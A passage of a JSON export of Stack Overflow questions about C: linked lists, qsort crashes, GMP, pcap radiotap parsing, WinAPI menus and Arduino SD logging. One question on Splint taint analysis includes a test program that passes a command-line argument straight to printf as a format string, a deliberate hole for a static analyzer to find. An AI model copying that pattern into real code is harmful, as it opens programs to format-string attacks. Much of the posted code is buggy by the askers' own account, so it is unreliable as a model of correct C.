&lt;stdio.h&gt;\n\n#include \"io.h\"\n#include \"ga.h\"\n\nint main() {\n    struct s1 s1i;\n    struct s2 s2i;\n\n    io_init(&amp;s1i, &amp;s2i);\n    ga_init(s1i);\n\n    return 0;\n}\n</code></pre>\n"},{"tags":["c","type-conversion","gmp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13240516,"title":"How to convert two gmpz_t to a mpq_t?","body":"<p>I have two integers (gmpz_t), and I need to express them as a fraction (one being the numerator, the other the denominator). The only solution I found is using <code>char* mpz_get_str (char *str, int base, mpz_t op)</code> to convert them both to <code>char*</code>, then concatenate them with a \"/\" inbetween, and then use  <code>int mpq_set_str (mpq_t rop, char *str, int base)</code> to put the value into a rational. But that seems like a lot of effort and I imagine there must be a better way.</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":74,"score":2,"question_id":13226474,"title":"While loop freezes up always right before it's finished","body":"<p>I've got this nested while loop, reading lines in from a file and creating an adjacency list. The problem doesn't seem to be with the inner loop, because it gets through that one, but it stops running right before it saves the very last point from the file into the adjacency list. I've tested with several different files (of different sizes), it's always right before the very last point. I can't for the life of me figure out why it would do that, but maybe someone else can help me out?</p>\n\n<p>The lines from the file are stored just fine into the current->next array, it's just the very last of the newPt adjacency list I'm having trouble with. It is, in fact, getting into the while loop the last time, it just can't seem to execute the last couple of lines.</p>\n\n<pre><code>while(fscanf(fptr, \"%d %d %d\", &amp;u, &amp;v, &amp;w) != EOF) { //read from file\n    current-&gt;next=malloc(sizeof(struct line));\n    current=current-&gt;next;\n    current-&gt;u=u;\n    current-&gt;v=v;\n    current-&gt;w=w;\n    current-&gt;useful=0;\n    //add point to adjacency list\n    currentPt=aList[u];\n    while((currentPt-&gt;adj)!=NULL) {\n        currentPt=currentPt-&gt;adj;\n    }\n    newPt=malloc(sizeof(struct adjacent));\n    newPt-&gt;x=v;\n    newPt-&gt;adj=NULL;\n    currentPt-&gt;adj=newPt;\n}\n</code></pre>\n\n<p>These are the structures I'm using, if that helps:</p>\n\n<pre><code>    struct line {\n        int u;\n        int v;\n        int w;\n        int useful;\n        struct line *next;\n    };\n    struct adjacent {\n        int x;\n        int onqueue;\n        struct adjacent *adj;\n    };\n    struct adjacent *aList[num+1];\n    struct line *current;\n    struct adjacent *currentPt;\n</code></pre>\n"},{"tags":["c","arrays","list","2d","linked"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":55,"score":1,"question_id":13239623,"title":"C Two Dimensional Array into Linked List","body":"<p>So I'm still trying to wrap my head around linked lists in C. They are.. mind-boggling to me right now because I have yet to fully understand pointers, let alone pointers to pointers, and dynamic memory allocation that linked lists require.</p>\n\n<p>I'm trying to create a two dimensional array with independent height, and width values. At most they would be 30x30. I have a two dimensional array let's call it arr[x][y]. arr[x][y] is filled with values of integers ranging from -2 to 1, how would I transfer this two dimensional array into a linked list? How would I then access values from this linked list on whim? I'm very confused, and any help would be appreciated. I'm looking through tutorials as we speak.</p>\n\n<p>Additionally this is supposed to be a sort of stack linked list where I could call functions such as push(pushes a new value to the top of the linked list), pop(pops a value from the top of the linked list), top(returns the value most recently pushed onto the stack), isEmpty(checks if the stack is empty). </p>\n\n<p>I don't need any full code, but code would be helpful here. I just need an understanding though of Linked Lists, and how to implement these sort of functions. </p>\n\n<p>Additionally here is the assignment that this is related to: <a href=\"http://www.cs.uic.edu/bin/view/CS211/CS211Lab9F12\" rel=\"nofollow\">Assignment</a></p>\n\n<p>It's a maze solver, I've already done code for analyzing a ascii picture into integer values for the two dimensional array. And as stated above that is what I need help with.</p>\n"},{"tags":["c"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":66,"score":1,"question_id":13239025,"title":"Ordered linked list printing","body":"<p>I'm working on my homework assignment, and this is as far as i've gotten. I now need to know how to print out the information that has been inputed into the list. and i need to reconfigure the insertNode function to also sort the list from smallest to greatest.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nstruct listNode{\n  int data;    //ordered field\n  struct listNode *next;\n};\n\n//prototypes\nvoid insertNode(struct listNode *Head, int x);\nint printList(struct listNode *Head, int x);\nint freeList(struct listNode *Header, int x);\n\n//main\nint main(){\n     struct listNode Head = {0, NULL};\n     int x = 1;\n     printf(\"This program will create an odered linked list of numbers greater\"\n     \" than 0 until the user inputs 0 or a negative number.\\n\");\n     while (x &gt; 0){\n     printf(\"Please input a value to store into the list.\\n\");\n     scanf(\"%d\", &amp;x);\n          insertNode(&amp;Head, x);\n     }\n     printf(\"Program terminated.\\n\");\n     system(\"PAUSE\");\n     }\nvoid insertNode(struct listNode * Head, int x){\n     struct listNode *newNode, *current;\n     newNode = malloc(sizeof(struct listNode));\n     newNode-&gt;data = x;\n     newNode-&gt;next = NULL;\n     current = Head;\n     while (current-&gt;next != NULL &amp;&amp; current-&gt;data &lt; x) \n     {\n        current = current-&gt;next;\n        }\n\n        if(current-&gt;next == NULL){\n             current-&gt;next = newNode;\n        }\n        else{\n             newNode-&gt;next = current-&gt;next;\n             current-&gt;next = newNode;\n        }\n}\n</code></pre>\n"},{"tags":["c","analysis","static-code-analysis","splint","taint"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12649864,"title":"splint how to perform taint analysis","body":"<p>How to perform Taint Analysis using Splint?</p>\n\n<p>I have installed Splint on my Ubuntu 12.04. Created a small test case as below:</p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\nint main(int argc, char *argv[]) {\n    char a[10];\n    strncpy(a,argv[1],10);\n    printf(a);\n    return 0;\n}\n</code></pre>\n\n<p>Also created splint.xh file with the following contents:</p>\n\n<pre><code>int printf  (/*@untainted@*/ char *fmt, ...);\nchar *fgets (char *s, int n, FILE *stream) /*@ensures tainted s@*/ ;\nchar *strcat (/*@returned@*/ char *s1,  char *s2) /*@ensures s1:taintedness = s1:taintedness | s2:taintedness @*/ ;\nvoid strncpy (/*@returned@*/ char *s1,  char *s2, size_t num)    /*@ensures s1:taintedness = s1:taintedness | s2:taintedness @*/ ;\n</code></pre>\n\n<p>Also created splint.mts file with the below contents:</p>\n\n<pre><code>    attribute taintedness\n       context reference char *\n       oneof untainted, tainted\n       annotations\n         tainted reference ==&gt; tainted\n         untainted reference ==&gt; untainted\n                       transfers\n         tainted as untainted ==&gt; error \"Possibly tainted storage used where untainted required.\"\n       merge\n          tainted + untainted ==&gt; tainted\n       defaults\n          reference ==&gt; tainted\n          literal ==&gt; untainted\n          null ==&gt; untainted\n    end\n</code></pre>\n\n<p>Then finally ran the splint tool with the command:</p>\n\n<pre><code>    splint -mts splint prg001.c\n</code></pre>\n\n<p>Where prg001.c is the sample input, \"splint\" refers to splint.mts and splint.xh file. All the files are in the current directory.</p>\n\n<p>The output I received is:</p>\n\n<p>Splint 3.1.2 --- 21 Aug 2012</p>\n\n<p>prg001.c: (in function main)\nprg001.c:6:1: Format string parameter to printf is not a compile-time constant:\n                 a\n  Format parameter is not known at compile-time.  This can lead to security\n  vulnerabilities because the arguments cannot be type checked. (Use\n  -formatconst to inhibit warning)\nprg001.c:3:14: Parameter argc not used\n  A function parameter is not used in the body of the function. If the argument\n  is needed for type compatibility or future plans, use /<em>@unused@</em>/ in the\n  argument declaration. (Use -paramuse to inhibit warning)</p>\n\n<p>Finished checking --- 2 code warnings</p>\n\n<p>There is no hint of any taint analysis in the output. Can someone please help me on how to get the taint analysis done using Splint.</p>\n\n<p>Thanks</p>\n"},{"tags":["c","asp.net-mvc-3","visual-studio-2010"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":41,"score":-4,"question_id":13239462,"title":"Version Control for projects. Net","body":"<p>I need a simple version control, practical and preferably free, I count on the help?</p>\n"},{"tags":["c","arrays","matlab","multidimensional-array","save"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":103,"score":2,"question_id":13235412,"title":"Saving multidimensional arrays in C","body":"<p>I have saved multidimensional arrays in Matlab before (e.g. an array <code>A</code> that has size 100x100x100) using a .mat file and that worked out very nicely.</p>\n\n<p>What is the best way to save such multidimensional arrays in C?  The only way I can think of is to store it as a 2D array (e.g. convert a KxNxM array to a KNxM array)  and be careful in remembering how it was saved.  </p>\n\n<p>What is also desired is to save it in a way that can be opened later in Matlab for post-processing/plotting.</p>\n"},{"tags":["c","data-structures","struct","free","memcpy"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":33,"score":-1,"question_id":13239369,"title":"Error:free(): invalid next size (fast)","body":"<p>When I am freeing my memory in this part of code...i am getting an error showing as :free(): invalid next size (fast)</p>\n\n<pre><code>int insertRecord(char *record,int recordSize,long dataPageNumber)\n{\ndatapage *dataPage=(datapage *)malloc(sizeof(datapage));\nreadPage(dataPage,dataPageNumber);\n\nslotentry slot;\n\n//for checking and freeslotnumber storage\nint freeSlotNumber=-1;\nint negativeFlag=0;\nint freeFlag=0;\n\nif(recordSize+sizeof(slotentry)&lt;=dataPage-&gt;cfs)\n{\n    slot.slotsize = recordSize;\n    slot.slotaddress = dataPage-&gt;cfsptr;\n    dataPage-&gt;cfs -= (recordSize+sizeof(slotentry));\n    dataPage-&gt;cfsptr += recordSize;\n    dataPage-&gt;slotcount++;\n\n    memcpy(&amp;dataPage-&gt;data[slot.slotaddress],record,recordSize);\n\n    free(dataPage);\n    return 1;\n}\n</code></pre>\n\n<p><strong>After executing free(dataPage) i am getting the above error...</strong></p>\n\n<pre><code>typedef struct\n{\n   int pagenumber;\n   int priority;\n   long dirPageNo;\n   long cfs;\n   int cfsptr;\n   int slotcount;\n   char data[1];\n} datapage;\n\ntypedef struct\n{\n   int slotaddress;\n   int slotsize;\n} slotentry;\n</code></pre>\n\n<p>I had kept the free(dataPage) before the memcpy it's working fine but after memcpy it's not working.. and showing the error....Can any one help me from this issue...</p>\n"},{"tags":["python","c"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":32,"score":2,"question_id":13238192,"title":"Global PyObject* variable in C-Python extension","body":"<p>In a C extension to my Python program, I am trying to improve performance by setting two of the inputs to the main C function (which is called millions of times) as global variables, as they don't change often, so that I don't have to keep supplying them from Python using a lambda wrapper to the C function (which wastes a nontrivial amount of time). My code looks like this. First I declare the global variables at the top of the file:</p>\n\n<pre><code>unsigned char* splitArray;\nPyObject* wordCmp;\n</code></pre>\n\n<p>Then the Python API function to set them:</p>\n\n<pre><code>static PyObject* py_set_globals(PyObject *self, PyObject *args)\n{\n    free(wordCmp);\n    free(splitArray);\n\n    char* splitChars;\n    PyObject* wordC;\n\n    if (!PyArg_ParseTuple(args, \"sO\", &amp;splitChars, &amp;wordC))\n        return NULL;\n\n    wordCmp = (PyObject*)malloc(sizeof(PyObject));\n    memcpy(wordCmp, wordC, sizeof(PyObject));\n    splitArray = splitchars_to_mapping(splitChars);\n\n    return Py_BuildValue(\"\");\n}\n</code></pre>\n\n<p>In this case, splitArray is assigned to a 128-character array which is malloc'ed in the function splitchars_to_mapping, and wordCmp is a Python function object that is passed to C. Anyway, as far as I can tell, the char* splitArray works fine as a global variable, but when I later try to call wordCmp using PyEval_CallObject, Python/C crashes. So I have two questions:</p>\n\n<ol>\n<li>Why doesn't C crash immediately when I try to free the uninitialized pointers wordCmp and splitArray at the beginning of the function?</li>\n<li>Why am I unable to call wordCmp later when I have properly stored it on the heap and saved a reference to it as a global?</li>\n</ol>\n"},{"tags":["c","unix"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":81,"score":3,"question_id":13239188,"title":"Sorting a struct in C","body":"<p>I'm attempting to sort a struct of students in C. I'm using qsort and doing a simple string comparison. Not sure why I'm getting a seg fault. I am casting and dereferencing the struct appropriately in the comparator function. I've been banging my head on this one for a while.</p>\n\n<pre><code> char *last;\n char *first;\n chart *social;\n float gpa;\n Major, of enum type with some fields that you make up\n int age\n function pointer: gpa_comp (students are sorted by gpa)\n function pointer: name_comp (students are sorted by last, first)*/\n\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;math.h&gt;\n\ntypedef struct Student {\n    char * last;\n    char * first;\n    char * social;\n    int age;\n    float gpa;\n    enum { ComputerScience = 1, History, Biology } major;\n} Student;\n\nvoid gpa_comp(Student **);\nint gpa_comparator(const void * a, const void * b);\nvoid name_comp(Student **);\nint name_comparator(const void * a, const void * b);\nvoid make_student_list(Student **);\nint student_cmp(const void * a, const void * b);\nvoid print_students (Student ** s, size_t len);\nint flt_cmp(const float a, const float b);\n\nint main(int argc, char const *argv[])\n{\n    int i;\n    struct Student ** students = (struct Student **)malloc(5 * sizeof(struct Student *));\n\n    for (i = 0; i &lt; 5; ++i) {\n        students[i] = (struct Student *)malloc(sizeof(struct Student));\n    }\n\n    make_student_list(students);\n\n    printf(\"Students in no order\\n\");\n    print_students(students, 5);\n\n    printf(\"\\n\");\n    printf(\"Students Sorted By First Name Asc\\n\");\n    name_comp(students);\n\n    return 0;\n}\n\nint gpa_comparator(const void * a, const void * b){\n    const Student * s1 = (const Student *)a;\n    const Student * s2 = (const Student *)b;\n    return (int)(100.f*s1-&gt;gpa - 100.f*s2-&gt;gpa);\n}\n\nint name_comparator(const void * a, const void * b){\n    const Student * s1 = (const Student *) a;\n    const Student * s2 = (const Student *) b;\n    return strcmp(s1-&gt;first, s2-&gt;first);\n}\n\nvoid print_students (Student ** s, size_t len) {\n    int c;\n    for (c = 0; c &lt; len; c++){\n        printf(\"%s - %s - %2f\\n\", s[c]-&gt;first, s[c]-&gt;last, s[c] -&gt; gpa);\n    }\n}\n\nvoid gpa_comp(Student ** students) {\n    size_t len = 5;\n    qsort(students, len, len, gpa_comparator);\n    print_students(students, len);\n}\n\nvoid name_comp(Student ** students){\n    qsort(students, 5, sizeof(Student), name_comparator);\n    print_students(students, 5);\n}\n\nvoid make_student_list(Student ** s){\n    s[0]-&gt;first = \"Dave\";\n    s[0]-&gt;last = \"Johnson\";\n    s[0]-&gt;social = \"362-89-3284\";\n    s[0]-&gt;major = ComputerScience;\n    s[0]-&gt;gpa = 3.5;\n\n    s[1]-&gt;first = \"Sally\";\n    s[1]-&gt;last = \"Susie\";\n    s[1]-&gt;social = \"251-43-9220\";\n    s[1]-&gt;major = History;\n    s[1]-&gt;gpa = 3.4;\n\n    s[2]-&gt;first = \"Molly\";\n    s[2]-&gt;last = \"Thomas\";\n    s[2]-&gt;social = \"123-45-2343\";\n    s[2]-&gt;major = Biology;\n    s[2]-&gt;gpa = 3.3;\n\n    s[3]-&gt;first = \"Brett\";\n    s[3]-&gt;last = \"Bigler\";\n    s[3]-&gt;social = \"523-364-3462\";\n    s[3]-&gt;major = ComputerScience;\n    s[3]-&gt;gpa = 3.9;\n\n    s[4]-&gt;first = \"Sandra\";\n    s[4]-&gt;last = \"Salami\";\n    s[4]-&gt;social = \"724-457-2455\";\n    s[4]-&gt;major = Biology;\n    s[4]-&gt;gpa = 4.0;\n}\n</code></pre>\n"},{"tags":["c","ascii","ansi"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":75,"score":3,"question_id":13238388,"title":"Remove letter accents from a given text","body":"<p>Maybe I'm missing something obvious, but is there a \"painless\" way to replace the accented letters in a given text with their unaccented counterparts? I can only use the standard ANSI C libraries/headers, so my hands are tied. What I've tried so far:</p>\n\n<pre><code>unsigned char currentChar;\n\n(...)\n\nif (currentChar == 'à') { \n    currentChar = 'a'; \n}\nelse if (currentChar == 'è' || currentChar == 'é') {\n    currentChar = 'e'; \n}\nelse if (...)\n</code></pre>\n\n<p>However, this doesn't work. Detecting accented vowels with their extended ASCII value isn't an option, either, as I've noticed that it changes depending upon the system locale.</p>\n\n<p>Any hints/suggestions?</p>\n\n<p>(update)</p>\n\n<p>Thanks for the answers, but I'm not really asking for the best approach for this problem - I'll think about it later. I'm simply asking for a way to detect the accented vowels, as the code above simply ignores them.</p>\n\n<p>(update #2)</p>\n\n<p>Okay. Let me clarify:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    int i;\n    char vowels[6] = {'à','è','é','ì','ò','ù'};\n    for (i = 0; i &lt; 6; i++) {\n        switch (vowels[i]) {\n            case 'à': vowels[i] = 'a'; break;\n            case 'è': vowels[i] = 'e'; break;\n            case 'é': vowels[i] = 'e'; break;\n            case 'ì': vowels[i] = 'i'; break;\n            case 'ò': vowels[i] = 'o'; break;\n            case 'ù': vowels[i] = 'u'; break;\n        }\n     }\n     printf(\"\\n\");\n     for (i = 0; i &lt; 6; i++) {\n         printf(\"%c\",vowels[i]);\n     }\n     printf(\"\\n\");\n     return 0;\n}\n</code></pre>\n\n<p>This code still prints \"àèéìòù\" as its output. This is my problem. I appreciate the answers, however it's pointless to tell me to implement a conversion map, or a switch/case structure. I'll think about it <em>later</em>.</p>\n"},{"tags":["c","haskell","range-encoding","arithmetic-coding"],"answer_count":0,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":86,"score":6,"question_id":13239106,"title":"Library for arithmetic coding / range coding","body":"<p>I am looking for a library that implements a general purpose range coder or arithmetic coder that supports alphabets with a lot of symbols (millions). I am especially looking for libraries written in Haskell but C is also okay. Performance is not so important as I want to use the library as a prototyping tool for a later implementation by myself. Thanks for the help!</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":56,"score":3,"question_id":13238540,"title":"Obtain node number n of a linked list","body":"<p>If I have a linked list:</p>\n\n<pre><code>first node -----&gt; second node ------&gt; third node ---&gt; ?\n</code></pre>\n\n<p>Can I show the third node value ( for example ) without use a classic list-linear-searching algorithm?</p>\n\n<p>My attempt of getting the n'th node:</p>\n\n<pre><code>struct node* indexof( struct node* head, int i )\n{\n    int offset = (int)((char*)head-&gt;next - (char*)head);\n    return ((struct node*)((char*)head + offset * i));\n}\n</code></pre>\n"},{"tags":["c","compiler-errors","embedded"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":128,"score":6,"question_id":13237865,"title":"How do I check a C function for valid input during compile time?","body":"<p>I am writing embedded C code for a microcontroller. The code has to be shared between three different circuit boards, and the input/output configurations are set at run time from some tables during initialization.</p>\n\n<p>The microcontroller has 24 ADC channels, and I have a function that can either set or clear a pin as an ADC channel. This means that an input to the function can consist of 0 to 23 (which is set in the table) and nothing else.</p>\n\n<p>I would like to put some kind of preprocessor or compiler \"thing\" that could identify that the function received a value other than 0-23 and throw some kind of error or warning and prevent the code from compiling in case someone put an invalid value in the table.</p>\n\n<p>Does anyone have some advice on how best to do this?</p>\n"},{"tags":["c","events","gstreamer","gst"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":13238745,"title":"Custom sink element hangs for 2 minutes","body":"<p>I created a custom sink element that prints out the data received. When I run my pipeline, it hangs for a minute or two, and then it starts printing the data. The is the debug info I get before it hangs. After running the same pipeline using a fakesink</p>\n\n<p>gst-launch-0.10 -v ....  ! fakesink | grep -i -e chain -e event </p>\n\n<p>I got the following information:</p>\n\n<p><code>/GstPipeline:pipeline0/GstFakeSink:fakesink0: last-message = \"event   ******* E (type: 102, GstEventNewsegment, update=(boolean)false, rate=(double)1, applied-rate=(double)1, format=(GstFormat)GST_FORMAT_TIME, start=(gint64)7347441722222, stop=(gint64)7407127180074, position=(gint64)0;) 0x5adf2c0\" \n/GstPipeline:pipeline0/GstFakeSink:fakesink0: last-message = \"event   ******* E (type: 102, GstEventNewsegment, update=(boolean)false, rate=(double)1, applied-rate=(double)1, format=(GstFormat)GST_FORMAT_TIME, start=(gint64)7347441722222, stop=(gint64)7407127180074, position=(gint64)0;) 0x5adf2c0\" \n/GstPipeline:pipeline0/GstFakeSink:fakesink0: last-message = \"event   ******* E (type: 102, GstEventNewsegment, update=(boolean)false, rate=(double)1, applied-rate=(double)1, format=(GstFormat)GST_FORMAT_TIME, start=(gint64)7347441722222, stop=(gint64)7407127180074, position=(gint64)0;) 0x5adf2c0\" \n/GstPipeline:pipeline0/GstFakeSink:fakesink0: last-message = \"chain   ******* &lt; ( 1016 bytes, timestamp: 2:02:27.575188888, duration: none, offset: -1, offset_end: -1, flags: 256 delta_unit ) 0x5cd1c80\" \n/GstPipeline:pipeline0/GstFakeSink:fakesink0: last-message = \"chain   ******* &lt; ( 1016 bytes, timestamp: 2:02:27.608555555, duration: none, offset: -1, offset_end: -1, flags: 256 delta_unit ) 0x5cd1b80\" \n/GstPipeline:pipeline0/GstFakeSink:fakesink0: last-message = \"chain   ******* &lt; ( 1016 bytes, timestamp: 2:02:27.641922222, duration: none, offset: -1, offset_end: -1, flags: 256 delta_unit ) 0x5cd1a80\" \n/GstPipeline:pipeline0/GstFakeSink:fakesink0: last-message = \"chain   ******* &lt; ( 1016 bytes, timestamp: 2:02:27.675288888, duration: none, offset: -1, offset_end: -1, flags: 256 delta_unit ) 0x5cd2e20\" \n/GstPipeline:pipeline0/GstFakeSink:fakesink0: last-message = \"chain   ******* &lt; ( 1016 bytes, timestamp: 2:02:27.708655555, duration: none, offset: -1, offset_end: -1, flags: 256 delta_unit ) 0x5cd2610\" \n/GstPipeline:pipeline0/GstFakeSink:fakesink0: last-message = \"chain   ******* &lt; ( 1016 bytes, timestamp: 2:02:27.742022222, duration: none, offset: -1, offset_end: -1, flags: 256 delta_unit ) 0x5cd3ca0\" \n/GstPipeline:pipeline0/GstFakeSink:fakesink0: last-message = \"chain   ******* &lt; ( 1016 bytes, timestamp: 2:02:27.775388888, duration: none, offset: -1, offset_end: -1, flags: 256 delta_unit ) 0x5cd1390\" \n...</code></p>\n\n<p>There are 3 new segment events arriving before the data, and the first \ntwo represent ~ 59 seconds each of empty space before the real segment \nbegins. How can I make my element ignore these new segments? I'm using Gstreamer 0.10.\nThank you.</p>\n"},{"tags":["c++","c","winapi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":13238632,"title":"WinAPI menu freezes after some clicks","body":"<p>I have an application in win32 that has a top menu in its main window, this menu has 2 options with submenus in each. </p>\n\n<p>The problem is..after some clicks on its options it suddenly freezes. The rest of the application keeps responding normally, but when i click on the menu options, the buttons go down like pressed and the submenus just doesnt appear, and i need to restart the application or it wont work anymore.</p>\n\n<p>I thik it is something related to memory allocation, maybe i need to free some allocation, but since im new to this kind of programming, i can say just looking at it.</p>\n\n<p>Some code..i think its in the window procedure where i manipulate the WM_COMMAND that theres something wrong:</p>\n\n<pre><code>LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)\n{\n\nint wmId, wmEvent;\nPAINTSTRUCT ps;\nHDC hdc;\n\nHMENU hMenubar = CreateMenu();\nHMENU hFile = CreateMenu();\nHMENU hEDIT = CreateMenu();\nHMENU hHelp = CreateMenu();     \n\n\n\nswitch (message)\n{\n\n\ncase WM_COMMAND:\n    wmId    = LOWORD(wParam);\n    wmEvent = HIWORD(wParam);\n\n    // Parse the menu selections:\n\n    switch (wmId)\n    {\n    case ID_FILE_DIALOG2:\n        DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOG2), hWnd, Add);\n        break;\n\n    case ID_FILE_TESTE:\n\n    Check();\n\n    break;\n\n    case ID_FILE_DIALOG1:\n        DialogBox(hInst, MAKEINTRESOURCE(IDD_DIALOG1), hWnd, Conf);\n        break;\n\n    case ID_OPEN:\n        Open();\n        break;\n\n    case IDM_ABOUT:\n        DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);\n        break;\n\n    case IDM_EXIT:\n        DestroyWindow(hWnd);\n        PostQuitMessage(0);\n        break;\n\n    default:\n        return DefWindowProc(hWnd, message, wParam, lParam);\n\n    }\n    break;\n\ncase WM_PAINT:\n\n    break;\n\ncase WM_CLOSE:\n    DestroyWindow(hWnd);\n        PostQuitMessage(0);\nbreak;\n\ncase WM_DESTROY:\n\nbreak;\n\ndefault: \n    return DefWindowProc(hWnd, message, wParam, lParam);\n\n}\nreturn 0;\n}\n</code></pre>\n"},{"tags":["c++","c","arduino"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":13113113,"title":"Using SD.remove() and SD library in Arduino","body":"<p>I'm building a program which takes 10 measurements of an analog voltage on <code>pin0</code> and is printing it to a log file. The issue I'm running into comes when I try to ensure that the file is blank. I am using <code>SD.remove()</code> in order to remove a previous logfile. When I do this, the new log file is never actually written to. When I remove the call to <code>SD.remove()</code>, the program works correctly. Is this some known bug in the SD library or is there some sneaky way around this?</p>\n\n<p>The code is below.</p>\n\n<pre><code>#include &lt;SD.h&gt;\n#define OUTPUT_PIN 9 //Using SparkFun MP3 shield\n#define DEFAULT_OUTPUT 10\n#define VOLTAGE_REF (5)\n\n//Reads a voltage on pin0. by default, the reference voltage is set to 5 V, but\n//it can be changed by changing VOLTAGE_REF.\n\nvoid setup() {\n    Serial.begin(9600);\n    Serial.println(\"Program Initialized\");\n\n    pinMode(DEFAULT_OUTPUT ,OUTPUT); //Needs to be on to use the library\n    pinMode(0, INPUT);\n\n    if (!SD.begin(OUTPUT_PIN)) {\n        //init error\n        Serial.println(\"Error initializing SD card. Reset the Arduino and try again\");\n        return;\n    }\n\n    Serial.println(\"Card sucessfully initialized\");\n\n    if (SD.exists(\"LOGFILE.LOG\") {\n        SD.remove(\"LOGFILE.LOG\"); //We don't want to use the same file &lt;&lt;THIS IS THE BUG?\n    }\n\n    delay(10); //Make sure changes are applied\n\n    File logFile = SD.open(\"ANALOG.LOG\", FILE_WRITE); //Create a new one every time\n    if (!SD.exists(\"LOGFILE.LOG\")) {\n        Serial.println(\"There was some error making a new instance of the logfile?\");\n        delay(1000);\n        SD.open(\"ANALOG.LOG\", FILE_WRITE);\n    }\n    int i;\n\n    if (logFile) {\n        for(i=0;i&lt;10;i++) {\n            int j = 0;\n            char str[64];\n\n            Serial.print(\"Reading analog sensor value\");\n            for(j=0;j&lt;=i;j++) {\n                Serial.print(\".\");\n            }\n            Serial.println();\n\n            logFile.print(\"Read #\");\n            logFile.print(i+1);\n            logFile.print(\" : \");\n            logFile.print(doVoltageRead(0));\n             unsigned char l = logFile.println(\" V\");\n             if (!l)\n                 Serial.println(\"No data written\");\n             delay(500);\n        }\n        Serial.println(\"Done.\");\n        logFile.close(); //Close the logfile\n        Serial.println(\"Data sucessfully written\");\n    }\n    else {\n        //Couldn't create file\n        Serial.println(\"There was an error creating the logfile\");\n    }\n}\n\nvoid loop() {\n    //We don't really need to do anything here\n}\n\nfloat doVoltageRead(int pin) {\n    int voltageRead = analogRead(pin);\n    double divisor = (voltageRead * 0.00097752);\n    float finalVoltage =(VOLTAGE_REF * divisor);\n    Serial.println(finalVoltage);\n    return finalVoltage;\n}\n</code></pre>\n"},{"tags":["c","capture","packet","pcap"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":13238416,"title":"radiotap header pcap C","body":"<p>I am capturing packets with pcap in C. Because of compatibility I need to use link-type IEEE802_11_RADIO, but it's driving me crazy...\nI get crappy data but I don't find my mistake.\nHere is my code:</p>\n\n<pre><code>struct ieee80211_radiotap_header {\n   u_int8_t it_version;\n   u_int8_t it_pad;\n   u_int16_t it_len;\n   u_int32_t it_present;\n};\nstruct ieee80211_header {\n   u_int16_t fc;\n   u_int16_t duration;\n   u_int8_t da[6];\n   u_int8_t sa[6];\n   u_int8_t bssid[6];\n   u_int16_t seq_ctrl;\n};\nvoid process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)\n{\n   int offset = 0;\n\n   const struct ieee80211_radiotap_header *radiotap = (struct ieee80211_radiotap_header *)(packet);\n   printf(\"present: %d\\n\", radiotap-&gt;it_present);\n   offset += 8 + 1 + 1 + 2*2;\n   int8_t *signal = (int8_t *)(packet + offset);\n   printf(\"signal %d\\n\", *signal);\n\n   printf(\"radio len: %d\\n\", radiotap-&gt;it_len); \n   const struct ieee80211_header *wifi = (struct ieee80211_header *)(packet + radiotap-&gt;it_len);\n   printf(\"addr: %02x:%02x:%02x:%02x:%02x:%02x\\n\", wifi-&gt;sa[0], wifi-&gt;sa[1], wifi-&gt;sa[2], \n    wifi-&gt;sa[3], wifi-&gt;sa[4], wifi-&gt;sa[5]);\n}\n</code></pre>\n\n<p>The present field says 2159, so it says there are fields 0, 1, 2, 3, 5, 6 and 11, right? I want to access the antenna signal, so I try to access field 5. But my variable signal just says 0 all the time...\nSimilar with the mac src addr. It prints a wrong mac addr that does not match my device. And I got a filter ether src filter up that is definitely working.</p>\n\n<p>So does anyone have some advices?</p>\n"},{"tags":["c","linux","datetime","dst"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":174,"score":5,"question_id":6069533,"title":"DST restoration under Linux in C","body":"<p>I have date/time information from Berlin,Germany.\nFor example:\n2011-05-16 12:24:23,\n2011-01-21 17:00:31</p>\n\n<p>Unfortunatly, these times have NO daylight saving information. I know that the first date is CEST and the second time is CET.</p>\n\n<p>I could write a check whether the date/time is daylight saving or not.</p>\n\n<p>The summertime starts at the last sunday in march at 2:00 AM, and ends at the last sunday in october at 3 AM.</p>\n\n<p>Self developing such a check seems error prone to me. Is there something that can be already used under Linux in C?</p>\n\n<p>Thank you for your help.</p>\n"},{"tags":["objective-c","c"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":47,"score":0,"question_id":13238095,"title":"How to create binary data 